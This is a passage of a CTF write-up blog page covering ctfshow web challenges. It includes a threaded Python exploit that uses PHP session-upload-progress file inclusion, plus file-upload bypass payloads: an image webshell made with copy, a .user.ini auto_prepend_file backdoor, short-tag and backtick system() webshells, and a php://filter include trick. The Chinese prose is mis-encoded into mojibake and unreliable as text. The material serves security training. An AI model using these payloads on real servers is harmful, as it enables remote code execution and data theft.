exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($isVIP &amp;&amp; strrpos($ctf, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; strrpos($ctf,<span class="string">&quot;log&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>($ctf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šbanäº†logå­—ç¬¦ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨æ—¥å¿—åŒ…å«ï¼Œä½†å‘ç°å¯ä»¥ä½¿ç”¨sessionè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼ŒçŸ¥è¯†ç‚¹å¿˜è®°çš„å¯ä»¥çœ‹å‰é¢å†™çš„web82<br>
web82å†™çš„è„šæœ¬æ”¹æ”¹ç›´æ¥ç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/7 14:57</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://7eda1482-7964-4319-96d3-1689b4a62307.chall.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">10</span>)</span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dota.txt&#x27;</span>, f)&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;ctf&#x27;</span>:<span class="string">&#x27;/tmp/sess_flag&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.post(url+<span class="string">&#x27;?isVIP=1&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåå³å¯å¾—åˆ°flag</p>
<h2 id="æ–‡ä»¶ä¸Šä¼ "><a class="header-anchor" href="#æ–‡ä»¶ä¸Šä¼ ">Â¶</a>æ–‡ä»¶ä¸Šä¼ </h2>
<h3 id="web151"><a class="header-anchor" href="#web151">Â¶</a>web151</h3>
<p>ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œç„¶ååœ¨burpsuieé‡ŒæŠŠåç¼€pngæ›´æ”¹ä¸ºphpï¼Œå†å»æ‰§è¡Œå‘½ä»¤å³å¯ï¼Œåˆ¶ä½œå›¾ç‰‡é©¬æ–¹æ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨ä¸€å¼ å°ç‚¹çš„å›¾ç‰‡å’Œä¸€å¥è¯æœ¨é©¬ï¼Œåˆ©ç”¨copyå‘½ä»¤ç”Ÿæˆå›¾ç‰‡é©¬</span><br><span class="line">copy 1.png&#x2F;b+2.php&#x2F;a 3.png</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151/0YSHJ%7B%40I0T6KYXO29D_Q28L.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151/WWO85%7DNV%5BN~X%5B%29JU%7BG4VO5N.png" alt=""></p>
<h3 id="web152"><a class="header-anchor" href="#web152">Â¶</a>web152</h3>
<p>å’Œä¸Šé¢˜ä¸€æ ·çš„æ–¹æ³•</p>
<h3 id="web153"><a class="header-anchor" href="#web153">Â¶</a>web153</h3>
<p>å¼€å§‹å¯¹phpåç¼€è¿›è¡Œäº†é™åˆ¶ï¼Œè¿™é‡Œæˆ‘ä»¬åˆ©ç”¨<code>.user.ini</code>æ¥æ„é€ åé—¨</p>
<blockquote>
<p>php.iniæ˜¯phpçš„ä¸€ä¸ªå…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¯¹æ•´ä¸ªwebæœåŠ¡èµ·ä½œç”¨ï¼›è€Œ.user.iniå’Œ.htaccessä¸€æ ·æ˜¯ç›®å½•çš„é…ç½®æ–‡ä»¶ï¼Œ.user.iniå°±æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ä¸€ä¸ªphp.iniï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶æ¥æ„é€ åé—¨å’Œéšè—åé—¨ã€‚</p>
</blockquote>
<p>è¿™é‡Œè¯´ä¸€ä¸‹phpä¸­çš„ä¸¤ä¸ªé…ç½®é¡¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;filename      &#x2F;&#x2F;åŒ…å«åœ¨æ–‡ä»¶å¤´</span><br><span class="line">auto_append_file&#x3D;filename       &#x2F;&#x2F;åŒ…å«åœ¨æ–‡ä»¶å°¾</span><br></pre></td></tr></table></figure>
<p>ä¸¾ä¸ªä¾‹å­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;.user.ini</span><br><span class="line">auto_prepend_file&#x3D;1.png</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1.png</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1.php(ä»»æ„phpæ–‡ä»¶)</span><br></pre></td></tr></table></figure>
<p>æ»¡è¶³è¿™ä¸‰ä¸ªæ–‡ä»¶åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œåˆ™ç›¸å½“äºåœ¨1.phpæ–‡ä»¶é‡Œæ’å…¥äº†åŒ…å«è¯­å¥<code>require('1.png')</code>ï¼Œè¿›è¡Œäº†æ–‡ä»¶åŒ…å«ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¾æ¬¡ä¸Šä¼ å³å¯</p>
<p>é¦–å…ˆä¸Šä¼ <code>.user.ini</code>æ–‡ä»¶<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153/MTSOG%5B4H0OV0%28U52%7B%7DDQW11.png" alt=""><br>
æ¥ç€ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153/6BXA%29G%60IR%5B2%29T35_~6%60%5B%40A9.png" alt=""><br>
ç„¶åè®¿é—®uploadç›®å½•ï¼Œå³<code>åšé¢˜åœ°å€+/upload</code>å³å¯ï¼Œå› ä¸ºæ­¤ç›®å½•ä¸‹åŸæœ¬æœ‰ä¸ªindex.phpï¼Œæ¥ç€å†æ‰§è¡Œæˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬è·å–flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153/8K786RK91XNNQD0P%292%600X6K.png" alt=""></p>
<h3 id="web154"><a class="header-anchor" href="#web154">Â¶</a>web154</h3>
<p>ç»§ç»­æŒ‰ç…§ä¸Šé¢˜æ­¥éª¤ï¼Œä¼ ä¸€ä¸ª<code>.user.ini</code>æ–‡ä»¶ï¼Œæ¥ç€åœ¨ä¸Šä¼ å›¾ç‰‡é©¬çš„æ—¶å€™æŠ¥é”™äº†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154/%25QP8%60%25S%29ZYBOT%28S%60_%29T9E%295.png" alt=""><br>
è§£ç åæ˜¾ç¤ºçš„æ–‡å­—æ˜¯ä¸æ”¯æŒæ ¼å¼ï¼Œè¯´æ˜å¯èƒ½å†…å®¹é‡Œçš„phpè¢«banäº†ï¼Œæ”¹æˆçŸ­æ ‡ç­¾çš„å½¢å¼å†ä¸Šä¼ ï¼Œå‘ç°å¯ä»¥é€šè¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">çŸ­æ ‡ç­¾å½¢å¼ï¼š&lt;?&#x3D;system(&quot;tac ..&#x2F;f*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154/49%24EVN%25EGTU2X%290X0%7B5%28F2D.png" alt=""><br>
æ¥ç€å†è®¿é—®uploadç›®å½•ï¼Œå³å¯å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154/HI%7DZZ%2885N%5D8J%258S7%24Y08XDC.png" alt=""></p>
<h3 id="web155"><a class="header-anchor" href="#web155">Â¶</a>web155</h3>
<p>ç”¨ä¸Šé¢˜(web154)çš„åŠæ³•å¯ä»¥é€šè¿‡</p>
<h3 id="web156"><a class="header-anchor" href="#web156">Â¶</a>web156</h3>
<p>ç”¨ä¸Šé¢˜(web154)çš„åŠæ³•å¯ä»¥é€šè¿‡</p>
<h3 id="web157"><a class="header-anchor" href="#web157">Â¶</a>web157</h3>
<p>ä¸€æ ·ç”¨ä¸Šé¢˜(web154)çš„åŠæ³•å¯ä»¥é€šè¿‡ï¼Œä½†è¿‡æ»¤äº†åˆ†å·ï¼ŒæŠŠçŸ­æ ‡ç­¾åé¢çš„<code>;</code>å»æ‰ï¼Œå³</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">çŸ­æ ‡ç­¾å½¢å¼ï¼š&lt;?&#x3D;system(&quot;tac ..&#x2F;f*&quot;)?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web158"><a class="header-anchor" href="#web158">Â¶</a>web158</h3>
<p>å’Œä¸Šé¢˜ä¸€æ ·çš„åšæ³•</p>
<h3 id="web159"><a class="header-anchor" href="#web159">Â¶</a>web159</h3>
<p>è¿™é‡ŒæŠŠ()ç»™banäº†ï¼Œæˆ‘ä»¬é‡‡ç”¨åå¼•å·æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå³</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">çŸ­æ ‡ç­¾å½¢å¼ï¼š&lt;?&#x3D;&#96;tac ..&#x2F;f*&#96;?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web160"><a class="header-anchor" href="#web160">Â¶</a>web160</h3>
<p>ä¾æ—§ä¸Šä¼ ä¸ª<code>.user.ini</code>æ–‡ä»¶ï¼Œä½†åœ¨ä¼ å›¾ç‰‡é©¬çš„æ—¶å€™æŠŠåå¼•å·ç»™banäº†ï¼Œæˆ‘ä»¬ä½¿ç”¨includeå‘½ä»¤å»é…åˆphpä¼ªåè®®è¿›è¡Œè¯»å–ï¼Œå› ä¸ºæŠŠphpç»™banäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‹¼æ¥èµ·æ¥ï¼Œå³</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;include&quot;ph&quot;.&quot;p:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;flag.p&quot;.&quot;hp&quot;?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160/0%404S4D%28_JME9O%60DP%25A%28UC6Y.png" alt=""><br>
ä¸Šä¼ åè®¿é—®uploadç›®å½•<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160/ND%25%5D_ZJ6%60%28F4%25XNI%5D2XAPLE.png" alt=""><br>
æ¥ç€å†base64è§£ç å³å¯å¾—åˆ°flag</p>
<h3 id="web161"><a class="header-anchor" href="#web161">Â¶</a>web161</h3>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
